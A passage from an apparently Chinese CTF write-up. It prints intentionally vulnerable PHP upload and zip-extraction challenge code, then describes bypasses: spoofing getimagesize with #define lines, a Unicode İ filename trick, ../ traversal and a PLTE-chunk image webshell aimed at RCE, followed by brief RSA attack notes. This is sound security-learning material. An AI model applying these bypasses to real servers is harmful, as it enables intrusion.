    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;postedFile&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;size&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;512&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;这么大个的东西你是想d我吗？&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$imageinfo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;getimagesize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;postedFile&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$imageinfo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;FALSE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;如果不能好好传图片的话就还是不要来打扰我了&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$imageinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$imageinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;东西不能方方正正的话就很讨厌&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$fileName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;urldecode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;postedFile&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stristr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fileName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;stristr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fileName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;stristr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fileName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;h&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;stristr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fileName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ph&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;有些东西让你传上去的话那可不得了&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$imagePath&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;image/&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mb_strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fileName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;postedFile&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tmp_name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$imagePath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;upload success, image at &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$imagePath&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;传都没有传上去&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;扫目录能扫到example.php&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ctf&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ctf&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$ctf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ctf&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ctf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;poc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$zip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;\ZipArchive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$name_for_zip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;example/&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name_for_zip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name_for_zip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;zip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;要不咱们再看看？&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$zip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name_for_zip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;TRUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;都不能解压呢&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;可以解压，我想想存哪里&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$pos_for_zip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/tmp/example/&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;REMOTE_ADDR&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$zip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;extractTo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pos_for_zip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$zip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name_for_zip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$files&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;glob&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$pos_for_zip&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$files&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_dir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;imagecreatefrompng&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;imagesx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;imagesy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$second&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;imagecrop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;y&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;width&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;height&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$second&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;FALSE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$final_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pathinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;basename&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;imagepng&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$second&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;example/&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$final_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;imagedestroy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$second&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;imagedestroy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$first&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只要保证上传的时候POST数据流里面&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#define width 1
#define height 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这两行是独立出现的就可以过getimagesize&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516174250.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;经过一番调试，可以用一个txt文件和一个php文件打包一个压缩包上传，也可以直接抓包在POST数据流最后手动加上这两行&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516174522.png&#34; alt=&#34;image-20210516174519255&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;至于&lt;code&gt;stristr($fileName,&amp;quot;i&amp;quot;)&lt;/code&gt;，可以使用unicode字符&lt;code&gt;İ&lt;/code&gt;，经过&lt;code&gt;mb_strtolower&lt;/code&gt;转换变成小写字母&lt;code&gt;i&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在example解压的时候自然是&lt;code&gt;../&lt;/code&gt;目录穿越解压我们上传的压缩包&lt;/p&gt;
&lt;p&gt;然后就是&lt;code&gt;imagecreatefrompng&lt;/code&gt;，这个函数只要你确确实实是一张图片(也就是Windows下改后缀为png，能正常打开)就可以过，之后他使用&lt;code&gt;imagepng&lt;/code&gt;函数把这个文件输出到web路径，不过遗憾的是，经过这个两个函数一读一输出，图片内容会变&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516175639.png&#34; alt=&#34;image-20210516175636078&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;也就是说，通过Windows cmd的copy命令生成的图片马，不顶用，得换高级得马儿&lt;/p&gt;
&lt;p&gt;具体参考&lt;a class=&#34;link&#34; href=&#34;https://github.com/hxer/imagecreatefrom-/tree/master/png/analysis&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这篇文章&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;通常，系统在实现图片上传功能时，为了防范用户上传含有恶意 php 代码的图片，可采用 gd 库重建图片，gd 库重建图片的一系列函数 imagecreatefrom*，会检查图片规范，验证图片合法性，以此抵御图片中含有恶意 php 代码的攻击。&lt;/p&gt;
&lt;p&gt;分析底层源码可知， png signature 是不可能插入 php 代码的； IHDR 存储的是 png 的图片信息，有固定的长度和格式，程序会提取图片信息数据进行验证，很难插入 php 代码；而 PLTE 主要进行了 CRC 校验和颜色数合法性校验等简单的校验，那么很可能在 data 域插入 php 代码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们可以发现后面虽然变了，但是马儿并没有变：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516204108.png&#34; alt=&#34;image-20210516204106311&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;就当我们以为就要RCE的时候，php文件上传上去却出错了。&lt;/p&gt;
&lt;h2 id=&#34;crypto&#34;&gt;Crypto&lt;/h2&gt;
&lt;h3 id=&#34;rsa&#34;&gt;rsa&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;$e=3$且$m^3&amp;lt;n$，所以开立方根得到msg1&lt;/li&gt;
&lt;li&gt;RSA Common Module Attack，共模攻击&lt;/li&gt;
&lt;li&gt;已知P高位分解n，partial P 攻击，构造多项式求根找到P低位&lt;/li&gt;
&lt;/ol&gt;
